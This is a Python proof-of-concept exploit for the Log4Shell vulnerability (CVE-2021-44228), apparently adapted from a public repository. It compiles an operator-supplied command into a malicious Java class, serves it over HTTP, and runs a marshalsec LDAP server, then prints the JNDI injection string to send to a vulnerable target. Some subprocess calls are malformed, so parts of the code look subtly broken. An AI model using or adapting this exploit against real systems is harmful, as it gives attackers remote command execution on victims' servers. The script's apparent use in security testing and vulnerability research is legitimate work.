#Fork from: https://github.com/kozmer/log4j-shell-poc
#Edit by minhnq22, with simple Java class and RMI service option
#!/usr/bin/env python3

import argparse
import subprocess
import threading
from pathlib import Path
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

CUR_FOLDER = Path(__file__).parent.resolve()


def generate_payload(cmd: str) -> None:
    program = """
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("%s");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
""" % (cmd)

    p = Path("Exploit.java")
    
    try:
        p.write_text(program)
        subprocess.run(["javac -source 8 -target 8", str(p)])
    except OSError as e:
        print(f'[-] Something went wrong {e}')
        raise e
    else:
        print('[+] Exploit java class created success')


def payload(userip: str, ldapport: int, webport: int) -> None:
    cmd = input('Cmd:')
    generate_payload(cmd)

    print('[+] Setting up LDAP server\n')

    # create the LDAP server on new thread
    t1 = threading.Thread(target=ldap_server, args=(userip, ldapport, webport))
    t1.start()

    # start the web server
    print(f"[+] Starting Webserver on port {webport} http://0.0.0.0:{webport}")
    httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
    httpd.serve_forever()


def check_java() -> None:
    print("Check Java")


def ldap_server(userip: str, ldapport: int, webport: int) -> None:
    sendme = "${jndi:ldap://%s:%s/a}" % (userip, ldapport)
    print(f"[+] Send me: {sendme}\n")

    url = "http://{}:{}/#Exploit".format(userip, webport)
    subprocess.run([
        "java -cp",
        os.path.join(CUR_FOLDER, "marshalsec/marshalsec-0.0.3-SNAPSHOT-all.jar"),
        "marshalsec.jndi.LDAPRefServer",
        url,
        ldapport,
    ])


def main() -> None:
    print("CVE-2021-44228")

    parser = argparse.ArgumentParser(description='Log4Shell Exploit')
    parser.add_argument('--userip',
                        metavar='userip',
                        type=str,
                        default='0.0.0.0',
                        help='Enter IP for LDAPRefServer & Shell')
    parser.add_argument('--ldapport',
                        metavar='ldapport',
                        type=int,
                        default='1389',
                        help='listener port for LDAP port')
    parser.add_argument('--webport',
                        metavar='webport',
                        type=int,
                        default='8000',
                        help='listener port for HTTP port')

    args = parser.parse_args()

    try:
        check_java()
        payload(args.userip, args.ldapport, args.webport)
    except KeyboardInterrupt:
        print("Interrupted the program.")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
